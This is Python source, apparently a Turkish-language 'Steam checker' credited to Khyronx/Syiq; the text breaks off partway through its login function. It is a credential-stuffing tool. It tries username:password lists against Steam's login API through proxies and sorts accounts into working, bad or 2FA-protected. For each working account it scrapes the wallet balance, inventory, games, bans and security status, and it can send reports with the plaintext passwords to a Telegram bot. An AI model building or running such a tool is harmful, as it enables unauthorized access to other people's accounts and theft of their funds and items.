import requests
import uuid
import re
import os
import sys
import threading
from queue import Queue
from datetime import datetime
import time
import webbrowser
import base64
import random
import json
import binascii
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'
B = '\033[1m'

DEBUG = False

stats = {"HIT": 0, "BAD": 0, "2FA": 0, "TOTAL": 0, "CHECKED": 0}
config = {"save_file": False, "send_telegram": False, "bot_token": "", "chat_id": ""}
PRODUCER = "Khyronx/Syiq"
lock = threading.Lock()

COUNTRY_MAP = {
    "TR": "Türkiye", "KZ": "Kazakistan", "UA": "Ukrayna", "RU": "Rusya",
    "US": "Amerika Birleşik Devletleri", "GB": "İngiltere", "DE": "Almanya",
    "FR": "Fransa", "AR": "Arjantin", "BR": "Brezilya", "IN": "Hindistan",
    "CN": "Çin", "JP": "Japonya", "KR": "Güney Kore", "PL": "Polonya",
    "ES": "İspanya", "IT": "İtalya", "CA": "Kanada", "AU": "Avustralya",
    "NL": "Hollanda", "SE": "İsveç", "NO": "Norveç", "DK": "Danimarka",
    "FI": "Finlandiya", "MX": "Meksika", "ZA": "Güney Afrika", "ID": "Endonezya",
    "MY": "Malezya", "PH": "Filipinler", "SG": "Singapur", "TH": "Tayland",
    "VN": "Vietnam", "TW": "Tayvan", "AE": "Birleşik Arap Emirlikleri",
    "SA": "Suudi Arabistan", "EG": "Mısır", "GR": "Yunanistan", "PT": "Portekiz",
    "CZ": "Çekya", "HU": "Macaristan", "RO": "Romanya", "BG": "Bulgaristan",
    "RS": "Sırbistan", "HR": "Hırvatistan", "BA": "Bosna-Hersek", "SK": "Slovakya",
    "BY": "Belarus", "GE": "Gürcistan", "AZ": "Azerbaycan", "UZ": "Özbekistan",
    "TM": "Türkmenistan", "KG": "Kırgızistan", "TJ": "Tacikistan", "MD": "Moldova",
    "CH": "İsviçre", "AT": "Avusturya", "BE": "Belçika", "IE": "İrlanda",
    "NZ": "Yeni Zelanda", "CL": "Şili", "CO": "Kolombiya", "PE": "Peru",
    "VE": "Venezuela", "EU": "Avrupa Birliği"
}

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def send_tg(msg):
    if config["send_telegram"]:
        try:
            url = f"https://api.telegram.org/bot{config['bot_token']}/sendMessage"
            requests.post(url, data={"chat_id": config["chat_id"], "text": msg})
        except: pass

def print_banner():
    box = f"""{C}    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║   {W}Syiq/Khyronx STEAM CHECKER - {Y}V3{C}                             ║
    ║   {W}Developed By: {G}{PRODUCER}{C}                                 ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝{W}"""
    print(box)

def format_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if "://" in proxy_str:
        return proxy_str
    parts = proxy_str.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{proxy_str}"

def get_profile_details(session, steamid):
    details = {
        "last_seen": "Gizli / Bilinmiyor",
        "avatar_url": "Yok",
        "profile_url": f"https://steamcommunity.com/profiles/{steamid}"
    }
    
    try:
        r = session.get(f"https://steamcommunity.com/profiles/{steamid}", timeout=10)
        if r.status_code == 200:
            html = r.text
            
            state_match = re.search(r'<div class="profile_in_game_header">([^<]+)</div>', html)
            time_match = re.search(r'<div class="profile_in_game_name"[^>]*>([^<]+)</div>', html)
            
            status_parts = []
            if state_match:
                status_parts.append(state_match.group(1).strip())
            if time_match:
                status_parts.append(time_match.group(1).strip())
                
            if status_parts:
                state = " - ".join(status_parts)
                state = state.replace("Currently Offline", "Çevrimdışı")
                state = state.replace("Currently Online", "Şu an Çevrimiçi")
                state = state.replace("In-Game", "Oyunda")
                state = state.replace("Currently Çevrimdışı", "Çevrimdışı")
                state = state.replace("Last Online", "Son Görülme:")
                state = state.replace("Offline", "Çevrimdışı")
                state = state.replace("days ago", "gün önce").replace("hrs ago", "saat önce").replace("mins ago", "dakika önce")
                details["last_seen"] = state
                
            custom_url_match = re.search(r'https://steamcommunity\.com/id/([^/"]+)', html)
            if custom_url_match:
                details["profile_url"] = f"https://steamcommunity.com/id/{custom_url_match.group(1)}"
                
            avatar_match = re.search(r'<img[^>]+src="([^"]+_full\.jpg)"', html)
            if avatar_match:
                details["avatar_url"] = avatar_match.group(1)

        if details["last_seen"] == "Gizli / Bilinmiyor":
            r_xml = session.get(f"https://steamcommunity.com/profiles/{steamid}?xml=1", timeout=10)
            if r_xml.status_code == 200:
                text = r_xml.text
                
                match_state = re.search(r'<stateMessage><!\[CDATA\[(.*?)\]\]></stateMessage>', text)
                if not match_state:
                    match_state = re.search(r'<stateMessage>(.*?)</stateMessage>', text)
                    
                if match_state:
                    state = match_state.group(1).strip()
                    state = re.sub(r'<[^>]+>', ' ', state)
                    
                    if state.strip() == "Offline":
                        details["last_seen"] = "Çevrimdışı (Tarih Gizli veya Çok Eski)"
                    else:
                        state = state.replace("Currently Offline", "Çevrimdışı")
                        state = state.replace("Currently Online", "Şu an Çevrimiçi")
                        state = state.replace("In-Game", "Oyunda")
                        state = state.replace("Currently Çevrimdışı", "Çevrimdışı")
                        state = state.replace("Last Online", "Son Görülme:")
                        state = state.replace("Offline", "Çevrimdışı")
                        state = state.replace("days ago", "gün önce").replace("hrs ago", "saat önce").replace("mins ago", "dakika önce")
                        details["last_seen"] = " ".join(state.split())

    except Exception as e:
        if DEBUG: print(f"[DEBUG] Profil detayları çekme hatası: {e}")

    return details

def get_account_security(session):
    info = {
        "email": "Onaysız", 
        "phone": "Yok"
    }
    try:
        r = session.get("https://store.steampowered.com/account/", timeout=10)
        if r.status_code == 200:
            text = r.text
                
            if any(x in text for x in ["Email address verified", "E-posta adresi doğrulandı", "Verified", "Doğrulandı"]):
                info["email"] = "Onaylı"
                
            m_phone = re.search(r'(?:ending in|sonu)\s*(\d+)', text, re.IGNORECASE)
            if m_phone:
                info["phone"] = f"Kayıtlı (*{m_phone.group(1)})"
            elif "Manage your phone number" in text or "Telefon numaranızı yönetin" in text:
                info["phone"] = "Kayıtlı"
    except Exception as e:
        if DEBUG: print(f"[DEBUG] Güvenlik verisi çekme hatası: {e}")
    return info

def get_all_bans(session, steamid, games):
    ban_info = {"vac": "YOK", "trade": "YOK", "community": "YOK", "banned_games": []}
    try:
        r = session.get(f"https://steamcommunity.com/profiles/{steamid}/", timeout=10)
        if r.status_code == 200:
            html = r.text
            html_lower = html.lower()
            
            if re.search(r'Community ban on record|Topluluk yasaklaması', html, re.IGNORECASE):
                ban_info["community"] = "VAR"
            if re.search(r'Trade ban on record|Takas yasaklaması', html, re.IGNORECASE):
                ban_info["trade"] = "VAR"
                
            is_banned = False
            if re.search(r'profile_ban|VAC ban on record|game ban on record|yasaklanması kayıtlı|yasaklaması kayıtlı', html_lower):
                is_banned = True
                if re.search(r'game ban|oyun yasaklaması|oyun yasaklamasi', html_lower):
                    ban_info["vac"] = "VAR (Game Ban)"
                else:
                    ban_info["vac"] = "VAR (VAC)"
            
            if is_banned:
                banned_games = []
                
                cookies_dict = session.cookies.get_dict()
                cookie_string = "; ".join([f"{k}={v}" for k, v in cookies_dict.items()])
                headers = {
                    "Referer": "https://help.steampowered.com/",
                    "Cookie": cookie_string,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
                }
                
                endpoints = [
                    "https://help.steampowered.com/tr/wizard/VacBans",
                    "https://help.steampowered.com/tr/wizard/HelpWhyCantIPlay",
                    "https://help.steampowered.com/en/wizard/VacBans",
                    "https://help.steampowered.com/en/wizard/HelpWhyCantIPlay"
                ]
                
                html_pages = []
                for ep in endpoints:
                    try:
                        res = session.get(ep, headers=headers, timeout=10)
                        if res.status_code == 200 and "login" not in res.url.lower():
                            html_pages.append(res.text)
                    except: 
                        continue
                
                ignored_names = ["Giriş", "Ana Sayfa", "Destek", "Steam", "Steam Destek", "Oyunlar", "Yazılım", "Donanım", "Satın Alımlar", "Games", "Software", "Hardware", "Purchases", "Account", "Login", "My Account", "Hesabım"]
                
                for html_page in html_pages:
                    matches = re.findall(r'class="[^"]*help_wizard_button_title[^"]*"[^>]*>(.*?)</', html_page, re.IGNORECASE | re.DOTALL)
                    for m in matches:
                        m_clean = re.sub(r'<[^>]+>', '', m).strip()
                        if m_clean and m_clean not in ignored_names and m_clean not in banned_games:
                            banned_games.append(m_clean)
                            
                if not banned_games and games:
                    for g in games:
                        g_name = g.get("name", "")
                        if len(g_name) < 3 or g_name in ["Steam", "Giriş", "Destek"]:
                            continue
                            
                        for html_page in html_pages:
                            if g_name in html_page and g_name not in banned_games:
                                banned_games.append(g_name)
                                break
                
                if not banned_games:
                    ban_count_match = re.search(r'(\d+)\s*(?:VAC ban\(s\) on record|game ban\(s\) on record|yasaklanması kayıtlı)', html, re.IGNORECASE)
                    if ban_count_match:
                        banned_games.append(f"{ban_count_match.group(1)} adet oyun (İsimler gizli)")
                
                ban_info["banned_games"] = banned_games
                
    except Exception as e:
        if DEBUG: print(f"[DEBUG] Ban tarama hatası: {e}")
        
    return ban_info

def get_all_inventory_items(session, steamid):
    all_items = []
    try:
        r = session.get(f"https://steamcommunity.com/profiles/{steamid}/inventory/", headers={"Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"}, timeout=15)
        if r.status_code == 403 or "This profile is private" in r.text or "Bu profil gizli" in r.text:
            return [{"name": "Gizli Envanter", "count": 1}]
        
        match = re.search(r'var g_rgAppContextData = (\{.*?\});', r.text)
        if not match:
            return [{"name": "Boş Envanter", "count": 1}]
        
        app_data = json.loads(match.group(1))
        
        for appid, app_info in app_data.items():
            app_name = app_info.get("name", f"AppID:{appid}")
            if app_name == "Counter-Strike 2": app_name = "CS2"
            
            contexts = app_info.get("rgContexts", {})
            if isinstance(contexts, dict):
                for context_id, ctx_info in contexts.items():
                    if isinstance(ctx_info, dict):
                        asset_count = ctx_info.get("asset_count", 0)
                        
                        if asset_count > 0:
                            url = f"https://steamcommunity.com/inventory/{steamid}/{appid}/{context_id}?l=turkish&count=2000"
                            try:
                                inv_r = session.get(url, timeout=10)
                                if inv_r.status_code == 200:
                                    inv_data = inv_r.json()
                                    if inv_data and inv_data.get("success"):
                                        descriptions = inv_data.get("descriptions", [])
                                        assets = inv_data.get("assets", [])
                                        
                                        item_names_map = {}
                                        for desc in descriptions:
                                            classid = str(desc.get("classid", ""))
                                            name = desc.get("market_name") or desc.get("name", "Bilinmeyen Eşya")
                                            item_names_map[classid] = f"[{app_name}] {name}"
                                            
                                        for asset in assets:
                                            classid = str(asset.get("classid", ""))
                                            if classid in item_names_map:
                                                all_items.append(item_names_map[classid])
                                time.sleep(0.5) 
                            except Exception as e:
                                if DEBUG: print(f"[DEBUG] {appid}/{context_id} eşyaları çekilirken hata: {e}")
                        
        if not all_items:
            return [{"name": "Boş", "count": 1}]
            
        item_counts = Counter(all_items)
        sorted_items = sorted(item_counts.items(), key=lambda x: (-x[1], x[0]))
        
        return [{"name": name, "count": count} for name, count in sorted_items]
        
    except Exception as e:
        if DEBUG: print(f"[DEBUG] Tüm envanter çekme hatası: {e}")
        return [{"name": "Hata Oluştu", "count": 1}]

def get_country(session, steamid, balance=""):
    country_code = None
    try:
        r = session.get(f"https://steamcommunity.com/profiles/{steamid}", timeout=10)
        if r.status_code == 200:
            match = re.search(r'"loccountrycode"\s*:\s*"([^"]+)"', r.text, re.IGNORECASE)
            if match:
                country_code = match.group(1).upper()
            
            if not country_code:
                match_flag = re.search(r'countryflags/([a-zA-Z]{2})\.gif', r.text)
                if match_flag:
                    country_code = match_flag.group(1).upper()
                
        if not country_code:
            r_store = session.get("https://store.steampowered.com/account/", timeout=10)
            if r_store.status_code == 200:
                match_wallet = re.search(r'"wallet_country"\s*:\s*"([^"]+)"', r_store.text, re.IGNORECASE)
                if match_wallet:
                    country_code = match_wallet.group(1).upper()
                    
                if not country_code:
                    match_country = re.search(r'"country"\s*:\s*"([a-zA-Z]{2})"', r_store.text, re.IGNORECASE)
                    if match_country:
                        country_code = match_country.group(1).upper()

        if not country_code:
            r_market = session.get("https://steamcommunity.com/market/", timeout=10)
            if r_market.status_code == 200:
                match_market = re.search(r'g_strCountryCode\s*=\s*"([^"]+)"', r_market.text, re.IGNORECASE)
                if match_market:
                    country_code = match_market.group(1).upper()

        if not country_code:
            r_cart = session.get("https://store.steampowered.com/cart/", timeout=10)
            if r_cart.status_code == 200:
                match_cart = re.search(r'userCountryCode\s*=\s*[\'"]([a-zA-Z]{2})[\'"]', r_cart.text, re.IGNORECASE)
                if match_cart:
                    country_code = match_cart.group(1).upper()

        if not country_code and balance and balance not in ["Alınamadı", "0,00"]:
            balance_upper = str(balance).upper()
            currency_map = {
                "₺": "TR", "TL": "TR", "₸": "KZ", "KZT": "KZ", "₴": "UA", "UAH": "UA",
                "₽": "RU", "RUB": "RU", "P.": "RU", "AR$": "AR", "ARS": "AR",
                "R$": "BR", "BRL": "BR", "MEX$": "MX", "MXN": "MX", "S/": "PE", "PEN": "PE",
                "NT$": "TW", "TWD": "TW", "₹": "IN", "INR": "IN", "RP": "ID", "IDR": "ID",
                "฿": "TH", "THB": "TH", "RM": "MY", "MYR": "MY", "₫": "VN", "VND": "VN",
                "₱": "PH", "PHP": "PH", "₩": "KR", "KRW": "KR", "¥": "JP", "JPY": "JP",
                "€": "EU", "EUR": "EU", "£": "GB", "GBP": "GB", "$": "US", "USD": "US"
            }
            for sym, code in currency_map.items():
                if sym in balance_upper:
                    country_code = code
                    break

    except Exception as e:
        if DEBUG: print(f"[DEBUG] Ülke verisi çekme hatası: {e}")
        
    if country_code:
        return COUNTRY_MAP.get(country_code, country_code)
    return "Bilinmiyor"

def get_account_creation_date(session, steamid):
    try:
        r = session.get(f"https://steamcommunity.com/profiles/{steamid}", timeout=10)
        if r.status_code == 200:
            html = r.text
            match = re.search(r'"timecreated"\s*:\s*(\d+)', html)
            if match:
                timestamp = int(match.group(1))
                return datetime.fromtimestamp(timestamp).strftime('%d.%m.%Y')
            
            r_xml = session.get(f"https://steamcommunity.com/profiles/{steamid}?xml=1", timeout=10)
            if r_xml.status_code == 200:
                match_xml = re.search(r'<memberSince><!\[CDATA\[(.*?)\]\]></memberSince>', r_xml.text)
                if not match_xml:
                    match_xml = re.search(r'<memberSince>(.*?)</memberSince>', r_xml.text)
                if match_xml:
                    return match_xml.group(1).strip()
    except Exception as e:
        if DEBUG: print(f"[DEBUG] Kuruluş tarihi çekme hatası: {e}")
        
    return "Bilinmiyor"

def get_badge_count(session, steamid, access_token):
    try:
        r = session.get(
            "https://api.steampowered.com/IPlayerService/GetBadges/v1/",
            params={"access_token": access_token, "steamid": steamid},
            timeout=10,
        )
        if r.status_code == 200:
            data = r.json().get("response", {})
            badges = data.get("badges", [])
            return str(len(badges))
    except Exception as e:
        if DEBUG: print(f"[DEBUG] Rozet API hatası: {e}")

    try:
        r = session.get(f"https://steamcommunity.com/profiles/{steamid}/badges/", timeout=10)
        if r.status_code == 200:
            html = r.text
            match = re.search(r'profile_count_link_total">\s*(\d+)\s*</', html)
            if match:
                return match.group(1)
    except Exception as e:
        if DEBUG: print(f"[DEBUG] Rozet profil sayfası hatası: {e}")

    return "0"

def get_steam_points(session, access_token, steamid):
    try:
        r = session.get(
            "https://api.steampowered.com/ILoyaltyRewardsService/GetSummary/v1/",
            params={"access_token": access_token, "steamid": steamid},
            timeout=10
        )
        if r.status_code == 200:
            data = r.json()
            points = data.get("response", {}).get("summary", {}).get("points")
            if points is not None:
                return f"{int(points):,}"
    except Exception as e:
        if DEBUG: print(f"[DEBUG] Steam Puanı API hatası: {e}")

    try:
        sessionid = session.cookies.get("sessionid", "")
        r = session.get(
            "https://store.steampowered.com/pointssummary/ajaxgetpoints", 
            params={"sessionid": sessionid},
            timeout=10
        )
        if r.status_code == 200:
            try:
                data = r.json()
                points = data.get("points")
                if points is not None:
                    return f"{int(points):,}"
            except ValueError:
                pass
    except Exception as e:
        if DEBUG: print(f"[DEBUG] Steam Puanı Ajax hatası: {e}")

    return "0"

def get_friend_count(session, steamid, access_token):
    try:
        r = session.get(
            "https://api.steampowered.com/ISteamUser/GetFriendList/v1/",
            params={"access_token": access_token, "steamid": steamid},
            timeout=10,
        )
        if r.status_code == 200:
            data = r.json()
            friends_list = data.get("friendslist", {}).get("friends", [])
            return str(len(friends_list))
    except Exception: pass

    try:
        r = session.get(f"https://steamcommunity.com/profiles/{steamid}", timeout=10)
        if r.status_code == 200:
            html = r.text
            if "This profile is private" in html or "Bu profil gizli" in html:
                return "Gizli"
            
            match = re.search(r'href="[^"]+/friends/"[^>]*>.*?<span class="profile_count_link_total">\s*([\d,.]+)\s*</span>', html, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).replace(",", "").replace(".", "")
                
            if "Aramanızla eşleşen arkadaş bulunamadı" in html or "No friends" in html:
                return "0"
    except Exception: pass

    try:
        r = session.get(f"https://steamcommunity.com/profiles/{steamid}/friends/", timeout=15)
        if r.status_code == 200:
            html = r.text
            if "Aramanızla eşleşen arkadaş bulunamadı" in html or "No friends" in html or "You don't have any friends" in html:
                return "0"
            
            blocks = re.findall(r'class="selectable friend_block_v2', html)
            if blocks:
                return str(len(blocks))
                
            match2 = re.search(r'profile_count_link_total">\s*([\d,.]+)\s*</', html)
            if match2:
                return match2.group(1).replace(",", "").replace(".", "")
    except Exception: pass

    return "Bilinmiyor"

def get_cs2_prime_status(session):
    try:
        r = session.get("https://store.steampowered.com/account/licenses/", timeout=15)
        
        if r.status_code == 200:
            html = r.text.lower()
            if "prime status upgrade" in html or "seçkin durum yükseltmesi" in html or "prime status" in html:
                return "VAR ✅"
            
            return "Yok ❌"
        else:
            return "Yok ❌"
            
    except Exception as e:
        if DEBUG: print(f"[DEBUG] CS2 Prime çekme hatası: {e}")
        return "Bilinmiyor"

def get_steam_level(session, steamid, access_token):
    try:
        r = session.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/", params={"access_token": access_token, "steamid": steamid}, timeout=10)
        if r.status_code == 200:
            lvl = r.json().get("response", {}).get("player_level")
            if lvl is not None: return str(lvl)
    except Exception: pass

    try:
        r = session.get("https://api.steampowered.com/IPlayerService/GetBadges/v1/", params={"access_token": access_token, "steamid": steamid}, timeout=10)
        if r.status_code == 200:
            lvl = r.json().get("response", {}).get("player_level")
            if lvl is not None: return str(lvl)
    except Exception: pass

    try:
        r = session.get(f"https://steamcommunity.com/profiles/{steamid}", timeout=10)
        if r.status_code == 200:
            for pattern in [r'friendPlayerLevelNum[^>]*>\s*(\d+)', r'"player_level"\s*:\s*(\d+)', r'steamsince[^<]*<[^>]+>\s*(\d+)',]:
                m = re.search(pattern, r.text)
                if m: return m.group(1)
    except Exception: pass

    return "?"

def get_owned_games(session, access_token, steamid):
    try:
        r = session.get(
            "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/",
            params={"access_token": access_token, "steamid": steamid, "include_appinfo": "true", "include_played_free_games": "true", "format": "json"},
            timeout=15,
        )
        if r.status_code == 200:
            data  = r.json().get("response", {})
            games = data.get("games", [])
            games.sort(key=lambda g: g.get("playtime_forever", 0), reverse=True)
            return [{"name": g.get("name", f"AppID:{g.get('appid', 0)}"), "hours": round(g.get("playtime_forever", 0) / 60, 1)} for g in games]
    except Exception: pass
    return []

def get_inventory_summary(session, steamid):
    try:
        r = session.get(f"https://steamcommunity.com/profiles/{steamid}/inventory/", headers={"Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"}, timeout=15)
        if r.status_code == 403: return "Gizli"
        match = re.search(r'var g_rgAppContextData = (\{.*?\});', r.text)
        if not match:
            if "This profile is private" in r.text or "Bu profil gizli" in r.text: return "Gizli"
            return "Boş"
        
        app_data = json.loads(match.group(1))
        total = 0
        details = []
        for appid, app_info in app_data.items():
            app_name = app_info.get("name", f"AppID:{appid}")
            
            ctxs = app_info.get("rgContexts", {})
            if isinstance(ctxs, dict):
                app_total = sum(ctx_info.get("asset_count", 0) for ctx_info in ctxs.values() if isinstance(ctx_info, dict))
            else:
                app_total = app_info.get("asset_count", 0)
                
            if app_total == 0: app_total = app_info.get("asset_count", 0)
            
            if app_total > 0:
                total += app_total
                if str(appid) == "753" or app_name.lower() == "steam": 
                    details.append(f"Steam({app_total} ürün)")
                else:
                    if app_name == "Counter-Strike 2": app_name = "CS2"
                    elif app_name == "Team Fortress 2": app_name = "TF2"
                    details.append(f"{app_name}:{app_total}")
                    
        if not details: return "Boş"
        
        joined_details = " | ".join(details)
        return f"{total} item ({joined_details})"
        
    except Exception: 
        return "Hata"

def get_wallet_balance(session, steamid):
    try:
        r = session.get("https://store.steampowered.com/account/", headers={"Referer": "https://store.steampowered.com/"}, allow_redirects=True, timeout=10)
        if r.status_code == 200 and "/login" not in r.url:
            html = r.text
            for pat in [r'id="header_wallet_balance"[^>]*>\s*([^<]+)', r'class="accountBalance[^"]*"[^>]*>\s*([^<]+)', r'"formattedBalance"\s*:\s*"([^"]+)"', r'wallet_balance["\s]+[^>]*>\s*([^<]+)', r'<span[^>]+wallet[^>]*>\s*([\$₺£€\d][^<]{1,20})']:
                m = re.search(pat, html, re.IGNORECASE)
                if m:
                    val = m.group(1).strip()
                    if val and any(c.isdigit() for c in val) and len(val) < 25: return val
            if "wallet" in html.lower() or "account_" in html: return "0,00"
    except Exception: pass

    try:
        r = session.get("https://store.steampowered.com/api/getWalletBalance/", params={"steamid": steamid}, headers={"Referer": "https://store.steampowered.com/account/"}, timeout=10)
        if r.status_code == 200:
            d = r.json()
            if d.get("success"):
                bal = d.get("formattedBalance") or d.get("balance", "")
                if bal: return f"{bal} {d.get('currency', '')}".strip()
    except Exception: pass

    try:
        r = session.get("https://api.steampowered.com/ISteamMicroTxnSandbox/GetUserInfo/v2/", params={"steamid": steamid}, timeout=10)
        if r.status_code == 200:
            res = r.json().get("response", {}).get("result", {})
            if res.get("status") == "OK":
                bal = res.get("balance", "0")
                cur = res.get("currency", "USD")
                try: return f"{float(bal)/100:.2f} {cur}"
                except Exception: return f"{bal} {cur}"
    except Exception: pass

    return "Alınamadı"

def check_account(username, password, proxy_url=None):
    session = requests.Session()
    session.headers.update({
        "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9,tr;q=0.8",
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}

    try:
        rsa_res = session.get(
            "https://api.steampowered.com/IAuthenticationService/"
            f"GetPasswordRSAPublicKey/v1/?account_name={username}",
            timeout=10,
        ).json()
        rsa_data = rsa_res["response"]

        rsa_key = RSA.construct((
            int(rsa_data["publickey_mod"], 16),
            int(rsa_data["publickey_exp"], 16),
        ))
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted_pass = base64.b64encode(
            cipher.encrypt(password.encode("utf-8"))
        ).decode("utf-8")

        begin_res = session.post(
            "https://api.steampowered.com/IAuthenticationService/"
            "BeginAuthSessionViaCredentials/v1/",
            data={
                "account_name":         username,
                "encrypted_password":   encrypted_pass,
                "encryption_timestamp": rsa_data["timestamp"],
                "remember_login":       "true",
                "website_id":           "Community",
                "device_friendly_name": "Chrome Browser",
            },
            timeout=10,
        ).json()

        auth_resp = begin_res.get("response", {})
        steamid   = auth_resp.get("steamid")

        if not steamid: return "BAD", None

        confirmations = auth_resp.get("allowed_confirmations", [])
        guard_types   = [c.get("confirmation_type", 0) for c in confirmations]
        if any(t in (3, 4) for t in guard_types): return "2FA", None

        time.sleep(1.5) 
        
        poll_res = session.post(
            "https://api.steampowered.com/IAuthenticationService/"
            "PollAuthSessionStatus/v1/",
            data={
                "client_id":  auth_resp["client_id"],
                "request_id": auth_resp["request_id"],
            },
            timeout=10,
        ).json()

        poll_data     = poll_res.get("response", {})
        access_token  = poll_data.get("access_token")
        refresh_token = poll_data.get("refresh_token")

        if not access_token or not refresh_token: return "BAD", None

        session.get("https://steamcommunity.com/", timeout=10)
        sessionid = session.cookies.get("sessionid")
        
        if not sessionid:
            sessionid = binascii.hexlify(os.urandom(12)).decode()
            session.cookies.set("sessionid", sessionid, domain=".steamcommunity.com")
            session.cookies.set("sessionid", sessionid, domain=".steampowered.com")

        try:
            fin = session.post(
                "https://login.steampowered.com/jwt/finalizelogin",
                data={
                    "nonce":     refresh_token,
                    "sessionid": sessionid,
                    "redir":     "https://steamcommunity.com/login/home/?goto=",
                },
                timeout=10,
            )
            transfer_info = fin.json().get("transfer_info", [])
        except Exception:
            transfer_info = []

        for t in transfer_info:
            url    = t.get("url", "")
            params = t.get("params", {})
            if url:
                try: session.post(url, data=params, timeout=10)
                except Exception: pass

        jwt_cookie = f"{steamid}%7C%7C{access_token}"
        target_domains = [
            ".steamcommunity.com", 
            ".steampowered.com", 
            "store.steampowered.com", 
            "help.steampowered.com"
        ]
        
        for d in target_domains:
            session.cookies.set("steamLoginSecure", jwt_cookie, domain=d, secure=True)
            session.cookies.set("sessionid", sessionid, domain=d)
            
        session.cookies.set("Steam_Language", "turkish", domain=".steamcommunity.com")

        balance       = get_wallet_balance(session, steamid)
        games         = get_owned_games(session, access_token, steamid)
        creation_date = get_account_creation_date(session, steamid)
        country       = get_country(session, steamid, balance)
        level         = get_steam_level(session, steamid, access_token)
        badges_count  = get_badge_count(session, steamid, access_token)
        steam_points  = get_steam_points(session, access_token, steamid)
        inventory     = get_inventory_summary(session, steamid)
        cs2_prime     = get_cs2_prime_status(session)
        friends       = get_friend_count(session, steamid, access_token)
        game_count    = len(games)

        bans_info     = get_all_bans(session, steamid, games)
        sec_info      = get_account_security(session)
        prof_details  = get_profile_details(session, steamid)
        all_inv_items = get_all_inventory_items(session, steamid)

        report = []
        report.append("=====================================================================================")
        report.append(f"{username}:{password}")
        report.append("=====================================================================================")
        report.append("\n🎮 STEAM HESAP BİLGİLERİ")
        report.append(f"├─ 👤 HESAP BİLGİSİ")
        report.append(f"│    ├─ Giriş       : {username}:{password}")
        report.append(f"│    ├─ SteamID     : {steamid}")
        report.append(f"│    ├─ Profil URL  : {prof_details['profile_url']}")
        report.append(f"│    ├─ Avatar      : {prof_details['avatar_url']}")
        report.append(f"│    ├─ Ülke        : {country}")
        report.append(f"│    ├─ Kuruluş     : {creation_date}")
        report.append(f"│    └─ Son Görülme : {prof_details['last_seen']}")
        report.append("│")
        report.append(f"├─ 📊 İSTATİSTİKLER")
        report.append(f"│    ├─ Steam Level : {level}")
        report.append(f"│    ├─ Bakiye      : {balance}")
        report.append(f"│    ├─ Steam Puanı : {steam_points}")
        report.append(f"│    ├─ Rozetler    : {badges_count}")
        report.append(f"│    └─ Arkadaşlar  : {friends}")
        report.append("│")
        
        mail_icon = "✔️" if sec_info['email'] == "Onaylı" else "❌"
        phone_icon = "✔️" if "Kayıtlı" in sec_info['phone'] else "❌"
        prime_check = "✔️" if "VAR" in str(cs2_prime).upper() else "❌"
        prime_clean = "VAR" if "VAR" in str(cs2_prime).upper() else "Yok"
        
        report.append(f"├─ 🛡️ GÜVENLİK VE DURUM")
        report.append(f"│    ├─ E-Posta Onayı : {sec_info['email'].upper()} {mail_icon}")
        report.append(f"│    ├─ Telefon Onayı : {sec_info['phone'].upper()} {phone_icon}")
        report.append(f"│    └─ CS2 Prime     : {prime_clean} {prime_check}")
        report.append("│")
        
        vac_icon = "❌" if "VAR" in bans_info['vac'].upper() else "✔️"
        trade_icon = "❌" if bans_info['trade'] == "VAR" else "✔️"
        comm_icon = "❌" if bans_info['community'] == "VAR" else "✔️"
        
        report.append(f"├─ 🚫 YASAKLAMALAR (BAN)")
        report.append(f"│    ├─ Topluluk Banı : {bans_info['community']} {comm_icon}")
        report.append(f"│    ├─ Takas Banı    : {bans_info['trade']} {trade_icon}")
        if "VAR" in bans_info['vac'].upper():
            report.append(f"│    └─ VAC/Oyun Banı : {bans_info['vac']} {vac_icon}")
            b_games_str = ", ".join(bans_info['banned_games']) if bans_info['banned_games'] else "Tespit Edilemedi (Gizli Profil)"
            report.append(f"│         └─ Yasaklı Oyunlar: {b_games_str}")
        else:
            report.append(f"│    └─ VAC/Oyun Banı : YOK ✔️")
        report.append("│")
        
        report.append(f"├─ 🎮 OYUNLAR ({game_count})")
        if games:
            for i, g in enumerate(games):
                branch = "│    └─" if i == len(games) - 1 else "│    ├─"
                report.append(f"{branch} {g['name']} ({g['hours']}h)")
        else:
            report.append("│    └─ Yok")
        report.append("│")
        
        if isinstance(all_inv_items, list) and len(all_inv_items) > 0 and 'count' in all_inv_items[0]:
            if all_inv_items[0]['name'] in ["Gizli Envanter", "Boş Envanter", "Hata Oluştu", "Boş"]:
                report.append(f"└─ 🎒 TÜM ENVANTER : {all_inv_items[0]['name']} | {inventory}")
            else:
                total_items = sum(item['count'] for item in all_inv_items)
                report.append(f"└─ 🎒 TÜM ENVANTER ({total_items} Eşya) | {inventory}")
                for i, item in enumerate(all_inv_items):
                    branch = "     └─" if i == len(all_inv_items) - 1 else "     ├─"
                    report.append(f"{branch} {item['count']}x {item['name']}")
        else:
            msg = all_inv_items[0] if isinstance(all_inv_items, list) and all_inv_items else "Boş"
            report.append(f"└─ 🎒 TÜM ENVANTER : {msg} | {inventory}")
            
        report.append("\nYapımcı: @Syiq\n")
        multiline_str = "\n".join(report)
        
        return "HIT", {
            "username": username,
            "password": password,
